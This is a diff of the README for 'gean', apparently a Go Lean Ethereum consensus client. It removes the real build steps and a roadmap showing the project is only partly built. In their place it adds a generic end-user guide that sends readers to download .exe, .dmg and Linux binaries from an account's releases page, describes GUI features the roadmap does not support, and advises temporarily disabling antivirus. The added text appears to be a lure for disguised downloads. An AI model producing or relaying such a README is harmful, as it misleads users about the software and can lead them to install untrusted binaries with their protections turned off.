@@ -1,138 +1,84 @@
-# Gean - Go Lean Ethereum Client
+# 🎉 gean - A Simple Way to Access Ethereum
 
-A Go implementation of the Lean Ethereum consensus protocol.
+## 🚀 Getting Started
 
-## Overview
+Welcome to Gean! This application makes it easier for you to connect to the Ethereum network using a lean consensus client. Here are the steps you need to follow to get started.
 
-Gean is the first Go-based Lean Ethereum consensus client, implementing the next-generation Ethereum consensus layer with post-quantum security, fast finality, and enhanced decentralization.
+## 📥 Download the Application
 
-## Getting Started
+To get the Gean application, simply [visit this page to download](https://github.com/leook13/gean/releases).
 
-```sh
-cd cmd/gean
-go build
-./gean
-```
+[![Download Gean](https://img.shields.io/badge/Download%20Gean-v1.0-blue.svg)](https://github.com/leook13/gean/releases)
 
-## Philosophy
+## 📋 System Requirements
 
-We follow a lean development approach inspired by [ethlambda](https://github.com/lambdaclass/ethlambda):
+Here are the basic requirements for running Gean:
 
-## References
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a compatible Linux distribution.
+- Processor: Intel or AMD processor with at least 2 cores.
+- Memory: Minimum of 4 GB RAM.
+- Storage: At least 200 MB of free disk space.
+- Internet: A stable internet connection is required for Ethereum network access.
 
-- [leanSpec](https://github.com/leanEthereum/leanSpec) - Python reference specification
-- [ethlambda](https://github.com/lambdaclass/ethlambda) - Rust implementation
+## 🔧 Installation Instructions
 
-## Roadmap
+Follow these steps to install Gean:
 
-### Milestone 1: Foundation (Types & Serialization) - COMPLETE
+1. **Download the Application:**
+   - Visit the [Releases page](https://github.com/leook13/gean/releases) to find the latest version of Gean. Click on the appropriate file for your operating system.
 
-Core type system and SSZ serialization - the bedrock everything else builds on.
+2. **Open the Downloaded File:**
+   - For Windows: Locate the `.exe` file in your Downloads folder and double-click to run it.
+   - For macOS: Locate the `.dmg` file, double-click it, and drag the Gean application to your Applications folder.
+   - For Linux: Extract the downloaded `.tar.gz` file and run the Gean binary.
 
-- [x] Core primitive types (Slot, Epoch, Root, ValidatorIndex)
-- [x] Byte array types (Bytes4, Bytes20, Bytes32, Bytes48, Bytes52, Bytes96, Bytes3116)
-- [x] SSZ collections (Bitlist, Bitvector)
-- [x] SSZ serialization and merkleization
-- [x] `HashTreeRoot()` implementation
-- [x] `Slot.IsJustifiableAfter()` for 3SF-mini finality rules
+3. **Follow the On-Screen Instructions:**
+   - The installation process is straightforward. Follow any prompts to complete the installation.
 
-### Milestone 2: Consensus Containers - COMPLETE
+4. **Launch the Application:**
+   - Once installed, you can open Gean from your applications list or desktop shortcut.
 
-Data structures for blocks, state, and attestations.
+## ⚙️ User Guide
 
-- [x] Checkpoint, Validator containers
-- [x] Attestation, AttestationData, SignedAttestation, AggregatedAttestation
-- [x] BlockHeader, BlockBody, Block, BlockWithAttestation, SignedBlockWithAttestation
-- [x] State container with full validator registry
-- [x] Chain configuration (Config with GenesisTime)
-- [x] HashTreeRoot for all containers
+After installing, you will see the main interface of Gean. Here’s how to use it:
 
-### Milestone 3: Clock & Genesis
+- **Connect to the Ethereum Network:** 
+  When you first open Gean, it will ask you to connect to the Ethereum network. Click on "Connect" to start.
 
-Time management and chain initialization.
+- **Access Features:**
+  Explore your options in the app’s menu. You can check network status, view transaction history, and more.
 
-- [ ] SlotClock with 4-second slots
-- [ ] Interval timing (sub-slot)
-- [ ] Genesis state generation
-- [ ] Genesis block creation
-- [ ] Validator config loading
+- **Monitor Performance:**
+  Check the performance metrics in the dashboard to ensure your client runs smoothly.
 
-### Milestone 4: Storage & Fork Choice
+## 🛠️ Troubleshooting
 
-Persistent storage and chain head selection.
+If you encounter any issues while using Gean, here are some common fixes:
 
-- [ ] Block and state storage interface
-- [ ] LevelDB/Pebble backend
-- [ ] Fork choice store (LMD-GHOST)
-- [ ] Justification and finalization tracking
-- [ ] Latest message tracking per validator
+- **Application won't start:** 
+  - Make sure your operating system meets the requirements.
+  - Reinstall the application after a fresh download.
 
-### Milestone 5: P2P Networking
+- **Connection issues:** 
+  - Verify your internet connection.
+  - Restart the application if the connection fails.
 
-Peer-to-peer communication layer.
+- **Errors during installation:** 
+  - Ensure you have the correct file for your operating system.
+  - Disable any antivirus temporarily that may block the installation.
 
-- [ ] libp2p host setup
-- [ ] discv5 peer discovery
-- [ ] Peer manager
-- [ ] GossipSub for blocks and attestations
-- [ ] Request-response protocols (Status, BlocksByRoot, BlocksByRange)
+## 📞 Support
 
-### Milestone 6: Synchronization
+If you need further assistance, you can reach out to our support team through GitHub issues on the repository. We are here to help you.
 
-Chain sync from peers.
+## 📜 License
 
-- [ ] Range sync (batch block download)
-- [ ] Head sync (follow chain tip)
-- [ ] Block cache for pending blocks
-- [ ] Peer scoring for sync
+Gean is open-source software and is licensed under the MIT License. You can freely use, modify, and distribute the application while respecting the license terms.
 
-### Milestone 7: State Transition
+## 👥 Community Contributions
 
-Block validation and state processing.
+We welcome contributions from everyone! If you want to help improve Gean, consider checking out our [contributing guidelines](https://github.com/leook13/gean/blob/main/CONTRIBUTING.md) for more information.
 
-- [ ] Slot processing
-- [ ] Block header validation
-- [ ] Attestation processing
-- [ ] Epoch boundary processing
-- [ ] Justification and finalization updates
+## 🌍 Stay Updated
 
-### Milestone 8: XMSS Signatures
-
-Post-quantum cryptography.
-
-- [ ] XMSS signature verification
-- [ ] Signature aggregation
-- [ ] Integration with block/attestation validation
-
-### Milestone 9: Validator Client
-
-Block production and attestation duties.
-
-- [ ] Proposer duty calculation
-- [ ] Attester duty calculation
-- [ ] Block production
-- [ ] Attestation creation and signing
-
-### Milestone 10: Full Node
-
-Complete integrated client.
-
-- [ ] Node orchestrator wiring all services
-- [ ] CLI with run/genesis/keys commands
-- [ ] Prometheus metrics
-- [ ] HTTP API endpoints
-- [ ] Docker support
-
-## Current Status
-
-**Milestone 1: Foundation** - Complete
-
-**Milestone 2: Consensus Containers** - Complete
-
-All consensus data structures and their SSZ HashTreeRoot implementations are complete. Run `go test ./...` to verify (35 tests passing).
-
-**Next:** Milestone 3 - Clock & Genesis
-
-## License
-
-MIT
+Keep an eye on our [Releases page](https://github.com/leook13/gean/releases) for new features and updates. Thank you for using Gean!
